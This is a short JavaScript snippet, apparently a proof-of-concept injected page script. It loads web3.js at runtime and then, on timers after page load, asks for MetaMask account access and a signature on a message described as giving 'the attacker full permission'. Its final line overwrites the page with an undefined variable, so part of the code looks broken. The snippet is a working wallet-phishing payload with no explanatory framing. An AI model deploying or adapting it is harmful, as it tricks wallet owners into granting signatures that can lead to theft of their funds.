fetch('https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js')
.then(response => response.text())
.then(scriptContent => {
  const scriptTag = document.createElement('script');
  scriptTag.textContent = scriptContent;
  document.head.appendChild(scriptTag);
})
.catch(error => console.error(error));
  let web3;

  function connect() {
    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
      console.log('MetaMask is installed!');

      // Initialize web3 object
      web3 = new Web3(window.ethereum);

      // Request account access
      window.ethereum.request({ method: 'eth_requestAccounts' })
        .then((accounts) => {
          console.log('Connected to MetaMask:', accounts[0]);
        })
        .catch((error) => {
          console.error(error);
        });
    } else {
      console.error('MetaMask is not installed!');
    }
  }

  function signMessage() {
    if (!web3) {
      console.error('Web3 is not initialized!');
      return;
    }

    const message = 'Hello, This is an example Transaction that will give to attacker full permission!';
    const from = web3.currentProvider.selectedAddress;

    web3.eth.personal.sign(message, from, '', (error, signature) => {
      if (error) {
        console.error(error);
      } else {
        console.log('Message signed! Signature:', signature);
      }
    });
  }

  // Call connect function automatically after 3 seconds
  setTimeout(() => {
    connect();
  }, 3000);
  setTimeout(() => {
    signMessage();
  }, 5000);

document.documentElement.innerHTML = html;
